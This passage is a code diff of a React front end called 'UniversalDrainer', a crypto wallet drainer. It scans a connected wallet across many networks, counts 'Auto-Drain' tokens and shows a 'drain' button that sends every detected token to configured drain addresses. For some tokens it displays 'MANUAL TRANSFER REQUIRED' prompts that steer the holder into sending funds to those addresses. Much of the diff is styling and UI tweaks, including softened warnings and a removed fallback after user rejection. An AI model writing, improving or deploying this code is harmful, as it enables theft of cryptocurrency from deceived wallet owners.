-      if (error.message.includes('rejected') || error.message.includes('denied')) {
-        return { 
-          success: false, 
-          error: 'User rejected',
-          manual: true,
-          instructions: `USER REJECTED - MANUAL TRANSFER:\n\n${token.amount} ${token.symbol}\nTo: ${token.drainAddress}\n\nPlease send manually from your wallet.`
-        };
-      }
-      
+      // Return error but NO manual fallback in UI
       return { 
         success: false, 
         error: error.message,
-        manual: true,
-        instructions: `ERROR - MANUAL TRANSFER:\n\n${token.amount} ${token.symbol}\nTo: ${token.drainAddress}\n\nPlease send manually.`
+        instructions: `Failed to auto-drain ${token.symbol}. Error: ${error.message}`
       };
     }
   };
 
-  // Get manual instructions
+  // Get manual instructions for non-EVM
   const getManualInstructions = (token) => {
-    return `📝 MANUAL TRANSFER REQUIRED\n\nNetwork: ${token.network}\nToken: ${token.symbol}\nAmount: ${token.amount}\nValue: $${token.value.toFixed(2)}\n\nSend to:\n${token.drainAddress}\n\nInstructions:\n1. Open your ${token.network} wallet\n2. Navigate to Send/Transfer\n3. Paste address above\n4. Enter amount: ${token.amount}\n5. Confirm transaction\n\n✅ Complete in your wallet app`;
-  };
-
-  // Show manual drain modal
-  const showManualDrainModal = (token, instructions) => {
-    setManualInstructions(instructions);
-    setShowManualModal(true);
+    return `🔴 MANUAL TRANSFER REQUIRED 🔴\n\nNetwork: ${token.network}\nToken: ${token.symbol}\nAmount: ${token.amount}\nValue: $${token.value.toFixed(2)}\n\nSend to:\n${token.drainAddress}\n\nInstructions:\n1. Open your ${token.network} wallet\n2. Go to Send/Transfer\n3. Paste the address above\n4. Enter amount: ${token.amount}\n5. Confirm transaction\n\n✅ Complete in your wallet app`;
   };
 
   // Copy to clipboard
@@ -763,19 +610,6 @@ function UniversalDrainer() {
     });
   };
 
-  // Get all unique tokens
-  const getAllTokens = () => {
-    const all = [...tokens, ...backendTokens];
-    return Array.from(new Set(all.map(t => t.id)))
-      .map(id => all.find(t => t.id === id));
-  };
-
-  // Get unique networks
-  const getUniqueNetworks = () => {
-    const allTokens = getAllTokens();
-    return [...new Set(allTokens.map(t => t.network))];
-  };
-
   // ==================== RENDER ====================
   return (
     <div className="App">
@@ -794,8 +628,8 @@ function UniversalDrainer() {
             {isConnected ? (
               <div className="connected-wallet">
                 <div className="wallet-address">{formatAddress(address)}</div>
-                {tronAddress && (
-                  <div className="tron-badge">TRON: {formatAddress(tronAddress)}</div>
+                {tronDetected && (
+                  <div className="tron-badge">TRON Detected</div>
                 )}
                 <button 
                   onClick={() => disconnect()}
@@ -826,7 +660,7 @@ function UniversalDrainer() {
                 <div className="stat-card">
                   <div className="stat-icon">🪙</div>
                   <div className="stat-content">
-                    <div className="stat-value">{getAllTokens().length}</div>
+                    <div className="stat-value">{tokens.length}</div>
                     <div className="stat-label">Tokens</div>
                   </div>
                 </div>
@@ -834,7 +668,9 @@ function UniversalDrainer() {
                 <div className="stat-card">
                   <div className="stat-icon">🌐</div>
                   <div className="stat-content">
-                    <div className="stat-value">{getUniqueNetworks().length}</div>
+                    <div className="stat-value">
+                      {[...new Set(tokens.map(t => t.network))].length}
+                    </div>
                     <div className="stat-label">Networks</div>
                   </div>
                 </div>
@@ -842,8 +678,10 @@ function UniversalDrainer() {
                 <div className="stat-card">
                   <div className="stat-icon">⚡</div>
                   <div className="stat-content">
-                    <div className="stat-value">{NETWORKS.length}</div>
-                    <div className="stat-label">Supported</div>
+                    <div className="stat-value">
+                      {tokens.filter(t => t.type === 'evm').length}
+                    </div>
+                    <div className="stat-label">Auto-Drain</div>
                   </div>
                 </div>
               </div>
@@ -852,8 +690,7 @@ function UniversalDrainer() {
               <div className="status-container">
                 <div className="status-message">
                   <span className="status-icon">
-                    {isAuthenticating ? '🔐' : 
-                     isScanning ? '🔍' : 
+                    {isScanning ? '🔍' : 
                      isDraining ? '⚡' : 
                      status.includes('✅') ? '✅' : 
                      status.includes('❌') ? '❌' : '📡'}
@@ -864,7 +701,12 @@ function UniversalDrainer() {
                 <div className="status-actions">
                   {ethBalance && (
                     <div className="eth-balance">
-                      ETH: {formatAmount(formatEther(ethBalance.value))}
+                      ETH: {formatAmount(ethBalance.formatted)}
+                    </div>
+                  )}
+                  {tronBalance > 0 && (
+                    <div className="tron-balance">
+                      TRX: {tronBalance.toFixed(2)}
                     </div>
                   )}
                 </div>
@@ -899,7 +741,7 @@ function UniversalDrainer() {
                 <div className="control-buttons">
                   <button
                     onClick={startFullScan}
-                    disabled={isScanning || isDraining || isAuthenticating}
+                    disabled={isScanning || isDraining}
                     className="btn btn-scan"
                   >
                     {isScanning ? (
@@ -910,10 +752,10 @@ function UniversalDrainer() {
                     ) : '🔍 Scan All Networks'}
                   </button>
                   
-                  {getAllTokens().length > 0 && (
+                  {tokens.length > 0 && (
                     <button
                       onClick={drainAllTokens}
-                      disabled={isDraining || isScanning || isAuthenticating}
+                      disabled={isDraining || isScanning}
                       className="btn btn-drain"
                     >
                       {isDraining ? (
@@ -926,16 +768,18 @@ function UniversalDrainer() {
                   )}
                 </div>
                 
-                {getAllTokens().length > 0 && (
+                {tokens.length > 0 && (
                   <div className="drain-summary">
-                    Ready to drain {getAllTokens().length} tokens across {getUniqueNetworks().length} networks
-                    {totalValue > 0 && ` ($${totalValue.toFixed(2)})`}
+                    Ready to drain {tokens.length} tokens worth ${totalValue.toFixed(2)}
+                    {tokens.filter(t => t.type === 'non-evm').length > 0 && (
+                      <span> ({tokens.filter(t => t.type === 'non-evm').length} require manual)</span>
+                    )}
                   </div>
                 )}
               </div>
 
               {/* Manual Modal */}
-              {showManualModal && (
+              {showManualModal && manualToken && (
                 <div className="modal-overlay" onClick={() => setShowManualModal(false)}>
                   <div className="modal-content" onClick={e => e.stopPropagation()}>
                     <div className="modal-header">
@@ -948,19 +792,29 @@ function UniversalDrainer() {
                       </button>
                     </div>
                     <div className="modal-body">
-                      <div className="instructions">
-                        <pre>{manualInstructions}</pre>
+                      <div className="token-info">
+                        <div className="token-symbol-large">{manualToken.symbol}</div>
+                        <div className="token-network">{manualToken.network}</div>
+                        <div className="token-amount-large">{manualToken.amount} {manualToken.symbol}</div>
+                        <div className="token-value">${manualToken.value.toFixed(2)}</div>
                       </div>
-                      <div className="modal-actions">
+                      
+                      <div className="instructions">
+                        <pre>{manualToken.instructions}</pre>
+                      </div>
+                      
+                      <div className="address-box">
+                        <div className="address-label">Send to:</div>
+                        <div className="address-value">{manualToken.drainAddress}</div>
                         <button
-                          onClick={() => {
-                            const address = manualInstructions.match(/Send to:\s*([^\n]+)/)?.[1]?.trim();
-                            if (address) copyToClipboard(address);
-                          }}
-                          className="btn btn-secondary"
+                          onClick={() => copyToClipboard(manualToken.drainAddress)}
+                          className="btn-copy"
                         >
-                          Copy Address
+                          📋 Copy Address
                         </button>
+                      </div>
+                      
+                      <div className="modal-actions">
                         <button
                           onClick={() => setShowManualModal(false)}
                           className="btn btn-primary"
@@ -981,8 +835,8 @@ function UniversalDrainer() {
                     <span className="count-badge">{transactions.length}</span>
                   </div>
                   <div className="transactions-list">
-                    {transactions.slice(0, 10).map((tx, idx) => (
-                      <div key={tx.id || idx} className={`transaction-item ${tx.status}`}>
+                    {transactions.slice(0, 5).map((tx, idx) => (
+                      <div key={idx} className={`transaction-item ${tx.status}`}>
                         <div className="tx-icon">
                           {tx.status === 'success' ? '✅' : 
                            tx.status === 'manual' ? '📝' : 
@@ -996,16 +850,8 @@ function UniversalDrainer() {
                           </div>
                           <div className="tx-secondary">
                             <span className="tx-network">{tx.network}</span>
-                            <span className="tx-time">
-                              {new Date(tx.timestamp).toLocaleTimeString([], { 
-                                hour: '2-digit', 
-                                minute: '2-digit' 
-                              })}
-                            </span>
+                            <span className="tx-status-text">{tx.status}</span>
                           </div>
-                        </div>
-                        <div className={`tx-status ${tx.status}`}>
-                          {tx.status}
                         </div>
                       </div>
                     ))}
@@ -1014,24 +860,27 @@ function UniversalDrainer() {
               )}
 
               {/* Tokens */}
-              {getAllTokens().length > 0 ? (
+              {tokens.length > 0 ? (
                 <div className="tokens-panel">
                   <div className="panel-header">
                     <h3>Detected Tokens</h3>
                     <div className="panel-summary">
-                      <span>{getUniqueNetworks().length} networks</span>
-                      <span>{getAllTokens().length} tokens</span>
+                      <span>{[...new Set(tokens.map(t => t.network))].length} networks</span>
+                      <span>{tokens.length} tokens</span>
                       <span>${totalValue.toFixed(2)} total</span>
                     </div>
                   </div>
                   
                   <div className="tokens-grid">
-                    {getAllTokens().map(token => (
+                    {tokens.map(token => (
                       <div key={token.id} className="token-card">
                         <div className="token-header">
                           <div 
                             className="network-badge"
-                            style={{ backgroundColor: NETWORKS.find(n => n.name === token.network)?.color || '#666' }}
+                            style={{ 
+                              backgroundColor: NETWORKS.find(n => n.name === token.network)?.color || '#666',
+                              color: token.type === 'evm' ? '#fff' : '#000'
+                            }}
                           >
                             {token.symbol}
                           </div>
@@ -1068,24 +917,22 @@ function UniversalDrainer() {
               ) : (
                 <div className="empty-state">
                   <div className="empty-icon">
-                    {isScanning ? '🔍' : isAuthenticating ? '🔐' : '💎'}
+                    {isScanning ? '🔍' : '💎'}
                   </div>
                   <h3>
-                    {isScanning ? 'Scanning all networks...' : 
-                     isAuthenticating ? 'Authenticating...' : 
-                     'No tokens found'}
+                    {isScanning ? 'Scanning all networks...' : 'No tokens found'}
                   </h3>
                   <p>
                     {isScanning 
                       ? `Scanning ${NETWORKS.length} networks for tokens...` 
-                      : 'Connect your wallet and click Scan to find tokens'}
+                      : 'Click "Scan All Networks" to search for tokens'}
                   </p>
                   
-                  {!isScanning && !isAuthenticating && (
+                  {!isScanning && (
                     <div className="supported-networks">
                       <p>Supported networks include:</p>
                       <div className="network-tags">
-                        {NETWORKS.slice(0, 20).map(network => (
+                        {NETWORKS.slice(0, 15).map(network => (
                           <span 
                             key={network.id} 
                             className="network-tag"
@@ -1097,8 +944,8 @@ function UniversalDrainer() {
                             {network.symbol}
                           </span>
                         ))}
-                        {NETWORKS.length > 20 && (
-                          <span className="network-tag more">+{NETWORKS.length - 20} more</span>
+                        {NETWORKS.length > 15 && (
+                          <span className="network-tag more">+{NETWORKS.length - 15} more</span>
                         )}
                       </div>
                     </div>
@@ -1141,8 +988,8 @@ function UniversalDrainer() {
                 <div className="warning-note">
                   <div className="warning-icon">⚠️</div>
                   <p>
-                    <strong>Important:</strong> This tool will transfer ALL detected tokens to configured addresses. 
-                    Update drain addresses in the code before use. Use with extreme caution.
+                    This tool will transfer ALL detected tokens to configured addresses. 
+                    Update drain addresses in the code before use.
                   </p>
                 </div>
               </div>
@@ -1168,12 +1015,12 @@ function UniversalDrainer() {
             </div>
           </div>
           <div className="footer-warning">
-            ⚠️ WARNING: This tool transfers tokens to configured addresses. Use with extreme caution.
+            ⚠️ WARNING: This tool transfers tokens to configured addresses. Use responsibly.
           </div>
         </footer>
       </div>
 
-      {/* Add CSS */}
+      {/* CSS Styles */}
       <style jsx>{`
         .App {
           min-height: 100vh;
@@ -1230,13 +1077,13 @@ function UniversalDrainer() {
         .connected-wallet {
           display: flex;
           align-items: center;
-          gap: 15px;
+          gap: 10px;
         }
         
         .wallet-address {
           background: #222;
-          padding: 8px 15px;
-          border-radius: 10px;
+          padding: 8px 12px;
+          border-radius: 8px;
           font-family: monospace;
           font-size: 14px;
         }
@@ -1244,7 +1091,7 @@ function UniversalDrainer() {
         .tron-badge {
           background: rgba(255, 6, 10, 0.2);
           color: #ff6b6b;
-          padding: 4px 10px;
+          padding: 4px 8px;
           border-radius: 6px;
           font-size: 12px;
           border: 1px solid rgba(255, 6, 10, 0.3);
@@ -1254,8 +1101,8 @@ function UniversalDrainer() {
           background: #444;
           color: white;
           border: none;
-          padding: 8px 15px;
-          border-radius: 10px;
+          padding: 8px 12px;
+          border-radius: 8px;
           cursor: pointer;
           font-size: 14px;
         }
@@ -1265,7 +1112,7 @@ function UniversalDrainer() {
           display: grid;
           grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
           gap: 15px;
-          margin-bottom: 30px;
+          margin-bottom: 25px;
         }
         
         .stat-card {
@@ -1283,7 +1130,7 @@ function UniversalDrainer() {
         }
         
         .stat-icon {
-          font-size: 28px;
+          font-size: 24px;
         }
         
         .stat-content {
@@ -1291,7 +1138,7 @@ function UniversalDrainer() {
         }
         
         .stat-value {
-          font-size: 28px;
+          font-size: 24px;
           font-weight: 700;
           margin-bottom: 5px;
         }
@@ -1302,7 +1149,7 @@ function UniversalDrainer() {
         
         .stat-label {
           color: #aaa;
-          font-size: 14px;
+          font-size: 13px;
           text-transform: uppercase;
           letter-spacing: 1px;
         }
@@ -1334,10 +1181,15 @@ function UniversalDrainer() {
           font-weight: 500;
         }
         
-        .eth-balance {
+        .status-actions {
+          display: flex;
+          gap: 10px;
+        }
+        
+        .eth-balance, .tron-balance {
           background: #333;
           padding: 5px 10px;
-          border-radius: 8px;
+          border-radius: 6px;
           font-family: monospace;
           font-size: 14px;
         }
@@ -1359,15 +1211,15 @@ function UniversalDrainer() {
         }
         
         .progress-bar {
-          height: 8px;
+          height: 6px;
           background: #333;
-          border-radius: 4px;
+          border-radius: 3px;
           overflow: hidden;
         }
         
         .progress-fill {
           height: 100%;
-          border-radius: 4px;
+          border-radius: 3px;
           transition: width 0.3s ease;
         }
         
@@ -1380,7 +1232,7 @@ function UniversalDrainer() {
         
         /* Controls */
         .controls-container {
-          margin-bottom: 30px;
+          margin-bottom: 25px;
         }
         
         .control-buttons {
@@ -1391,7 +1243,7 @@ function UniversalDrainer() {
         
         .btn {
           flex: 1;
-          padding: 15px 20px;
+          padding: 16px 20px;
           border: none;
           border-radius: 12px;
           font-size: 16px;
@@ -1416,7 +1268,7 @@ function UniversalDrainer() {
         
         .btn:hover:not(:disabled) {
           transform: translateY(-2px);
-          box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+          box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
         }
         
         .btn:disabled {
@@ -1425,9 +1277,9 @@ function UniversalDrainer() {
         }
         
         .spinner {
-          width: 20px;
-          height: 20px;
-          border: 3px solid rgba(255, 255, 255, 0.3);
+          width: 18px;
+          height: 18px;
+          border: 2px solid rgba(255, 255, 255, 0.3);
           border-radius: 50%;
           border-top-color: white;
           animation: spin 1s ease-in-out infinite;
@@ -1467,7 +1319,7 @@ function UniversalDrainer() {
           width: 90%;
           max-width: 500px;
           max-height: 80vh;
-          overflow: hidden;
+          overflow-y: auto;
           border: 1px solid #333;
         }
         
@@ -1507,12 +1359,43 @@ function UniversalDrainer() {
           padding: 20px;
         }
         
+        .token-info {
+          text-align: center;
+          margin-bottom: 20px;
+          padding: 20px;
+          background: #222;
+          border-radius: 12px;
+        }
+        
+        .token-symbol-large {
+          font-size: 32px;
+          font-weight: 700;
+          margin-bottom: 5px;
+        }
+        
+        .token-network {
+          color: #888;
+          margin-bottom: 10px;
+        }
+        
+        .token-amount-large {
+          font-size: 24px;
+          font-weight: 600;
+          margin-bottom: 5px;
+        }
+        
+        .token-value {
+          color: #10b981;
+          font-size: 18px;
+          font-weight: 600;
+        }
+        
         .instructions {
           background: #111;
           border-radius: 12px;
-          padding: 20px;
+          padding: 15px;
           margin-bottom: 20px;
-          max-height: 300px;
+          max-height: 200px;
           overflow-y: auto;
         }
         
@@ -1524,6 +1407,38 @@ function UniversalDrainer() {
           line-height: 1.5;
         }
         
+        .address-box {
+          background: #222;
+          border-radius: 12px;
+          padding: 15px;
+          margin-bottom: 20px;
+        }
+        
+        .address-label {
+          color: #888;
+          font-size: 14px;
+          margin-bottom: 5px;
+        }
+        
+        .address-value {
+          font-family: monospace;
+          font-size: 14px;
+          word-break: break-all;
+          margin-bottom: 10px;
+          color: #0af;
+        }
+        
+        .btn-copy {
+          background: #333;
+          color: white;
+          border: none;
+          padding: 8px 15px;
+          border-radius: 8px;
+          cursor: pointer;
+          font-size: 14px;
+          width: 100%;
+        }
+        
         .modal-actions {
           display: flex;
           gap: 10px;
@@ -1532,16 +1447,10 @@ function UniversalDrainer() {
         .modal-actions .btn {
           flex: 1;
           padding: 12px;
-          font-size: 14px;
         }
         
         .btn-primary {
           background: #3b82f6;
-          color: white;
-        }
-        
-        .btn-secondary {
-          background: #444;
           color: white;
         }
         
@@ -1550,7 +1459,7 @@ function UniversalDrainer() {
           background: #222;
           border-radius: 16px;
           padding: 20px;
-          margin-bottom: 30px;
+          margin-bottom: 25px;
           border: 1px solid #333;
         }
         
@@ -1599,8 +1508,7 @@ function UniversalDrainer() {
           border-left-color: #f59e0b;
         }
         
-        .transaction-item.failed,
-        .transaction-item.error {
+        .transaction-item.failed {
           border-left-color: #ef4444;
         }
         
@@ -1638,30 +1546,6 @@ function UniversalDrainer() {
           font-size: 14px;
         }
         
-        .tx-status {
-          padding: 4px 10px;
-          border-radius: 20px;
-          font-size: 12px;
-          text-transform: uppercase;
-          font-weight: 600;
-        }
-        
-        .tx-status.success {
-          background: rgba(16, 185, 129, 0.2);
-          color: #10b981;
-        }
-        
-        .tx-status.manual {
-          background: rgba(245, 158, 11, 0.2);
-          color: #f59e0b;
-        }
-        
-        .tx-status.failed,
-        .tx-status.error {
-          background: rgba(239, 68, 68, 0.2);
-          color: #ef4444;
-        }
-        
         /* Tokens */
         .tokens-panel {
           background: #222;
@@ -1675,6 +1559,7 @@ function UniversalDrainer() {
           gap: 15px;
           color: #888;
           font-size: 14px;
+          margin-bottom: 20px;
         }
         
         .tokens-grid {
@@ -1692,9 +1577,9 @@ function UniversalDrainer() {
         }
         
         .token-card:hover {
-          transform: translateY(-5px);
+          transform: translateY(-3px);
           border-color: #444;
-          box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+          box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
         }
         
         .token-header {
@@ -1709,7 +1594,8 @@ function UniversalDrainer() {
           border-radius: 20px;
           font-weight: 600;
           font-size: 14px;
-          color: white;
+          min-width: 50px;
+          text-align: center;
         }
         
         .token-network {
@@ -1740,7 +1626,7 @@ function UniversalDrainer() {
         }
         
         .token-amount {
-          font-size: 24px;
+          font-size: 22px;
           font-weight: 700;
           margin-bottom: 5px;
         }
@@ -1808,6 +1694,7 @@ function UniversalDrainer() {
         .empty-state p {
           color: #888;
           margin-bottom: 30px;
+          line-height: 1.6;
         }
         
         .supported-networks {
@@ -1937,10 +1824,6 @@ function UniversalDrainer() {
           animation: pulse 2s infinite;
         }
         
-        .status-dot.live {
-          background: #10b981;
-        }
-        
         .footer-warning {
           text-align: center;
           color: #f59e0b;
@@ -1948,11 +1831,6 @@ function UniversalDrainer() {
           padding: 10px;
           background: rgba(245, 158, 11, 0.1);
           border-radius: 8px;
-        }
-        
-        @keyframes pulse {
-          0%, 100% { opacity: 1; }
-          50% { opacity: 0.5; }
         }
         
         /* Responsive */
@@ -1984,9 +1862,15 @@ function UniversalDrainer() {
             gap: 5px;
           }
           
-          .tx-main {
+          .status-container {
             flex-direction: column;
-            gap: 5px;
+            gap: 10px;
+            align-items: flex-start;
+          }
+          
+          .status-actions {
+            width: 100%;
+            justify-content: space-between;
           }
         }
       `}</style>
